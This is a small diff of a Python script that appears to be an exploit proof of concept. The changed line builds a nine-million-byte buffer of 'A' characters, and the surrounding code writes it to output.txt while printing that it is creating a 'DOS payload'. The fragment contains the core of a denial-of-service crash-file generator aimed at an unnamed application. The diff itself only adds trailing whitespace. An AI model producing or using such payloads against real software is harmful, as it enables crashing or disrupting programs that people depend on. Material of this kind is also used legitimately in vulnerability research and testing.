@@ -1,4 +1,4 @@
-buffer = "\x41" * 9000000
+buffer = "\x41" * 9000000 
 try:
     f=open("output.txt","w")
     print("[!] Creating %s bytes DOS payload...." %len(buffer))
